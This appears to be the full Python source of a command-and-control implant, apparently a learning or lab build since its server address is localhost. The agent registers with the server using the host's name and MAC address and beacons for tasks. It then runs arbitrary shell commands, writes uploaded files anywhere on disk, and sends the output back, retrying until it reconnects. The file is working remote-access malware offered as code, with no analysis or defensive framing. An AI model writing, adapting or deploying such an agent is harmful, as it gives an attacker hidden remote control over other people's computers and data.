import requests
import os
import time
import threading
import uuid
import json
import socket
import subprocess
import base64

SERVER = "http://127.0.0.1:8000/rpc"
MAX_BACKOFF = 15

class Agent:
    def __init__(self):
        self.client_id = None
        self.session = requests.Session()
        self.hostname = socket.gethostname()
        self.mac = self.get_mac()

        self.handlers = {
            "shell": self.handle_shell,
            "health": self.handle_health,
            "upload": self.handle_upload,
        }

    def rpc(self, method, **params):
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params,
            "id": str(uuid.uuid4())
        }

        try:
            res = self.session.post(
                SERVER,
                json = payload,
                timeout = 70
            )

            if res.status_code == 204:
                return None
            
            data = res.json()

            if "error" in data:
                err = data["error"]
                raise Exception(err["message"] if isinstance(err, dict) else err)
                
            return data.get("result")

        except (requests.RequestException, ValueError):
            raise

    @staticmethod
    def get_mac():
        mac = uuid.getnode()
        return ':'.join(
            f"{(mac >> shift) & 0xff:02x}"
            for shift in range(40, -1, -8)
        )

    @staticmethod
    def result(stdout="", stderr="", exit_code=0):
        return {
            "stdout": stdout,
            "stderr": stderr,
            "exit_code": exit_code
        }

    def handle_shell(self, params):
        cmd = params.get("cmd")

        if not cmd:
            return self.result(stderr = "no command provided", exit_code = -1)
        
        result = subprocess.run(
            cmd,
            shell = True,
            capture_output = True,
            text = True,
            timeout = 300
        )

        return self.result(
            stdout = result.stdout,
            stderr = result.stderr,
            exit_code = result.returncode
        )
    
    def handle_upload(self, params):
        path = params.get("path")
        data = params.get("data")

        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)

        with open(path, "wb") as f:
            f.write(base64.b64decode(data))
            
        return self.result(stdout=f"written: {path}")

    def handle_health(self, params):
        return self.result(
            stdout = json.dumps({
                "status": "ok",
                "hostname": self.hostname,
                "client_id": self.client_id
            }),
            exit_code = 0
        )

    def identify(self):
        result = self.rpc(
            "identify", 
            hostname = self.hostname,
            mac = self.mac
        )

        if result:
            self.client_id = result.get("client_id")

        return self.client_id

    def beacon(self):
        return self.rpc(
            "beacon", 
            client_id = self.client_id
        )
    
    def send_result(self, task_id, status, output):
        self.rpc(
            "task_result", 
            client_id = self.client_id,
            task_id = task_id,
            result = {
                "status": status,
                "output": output
            }
        )

    def execute_task(self, task):
        try:
            task_id = task.get("id")
            method = task.get("method")
            params = task.get("params", {})

            handler = self.handlers.get(method)
            if not handler:
                self.send_result(
                    task_id, 
                    "error",
                    self.result(stderr="method not found", exit_code=1)
                )
                return
            
            try:
                output = handler(params)
                status = "ok"
            except Exception as e:
                output = self.result(stderr = str(e), exit_code = -1)
                status = "error"

            self.send_result(task_id, status, output)
        
        except Exception:
            pass

    def run(self):
        while True:
            try:
                if self.identify():
                    break
            except Exception:
                pass

            time.sleep(5)
               
        print(f"[+] identified as {self.client_id}") # DEBUG
        backoff = 1

        while True:
            try:
                result = self.beacon()
                if result and result.get("task"):
                    threading.Thread(
                        target=self.execute_task,
                        args=(result["task"],),
                        daemon=True
                    ).start()
                
                backoff = 1
                time.sleep(5)

            except Exception:
                time.sleep(backoff)
                backoff = min(backoff + 1, MAX_BACKOFF)

if __name__ == "__main__":
    Agent().run()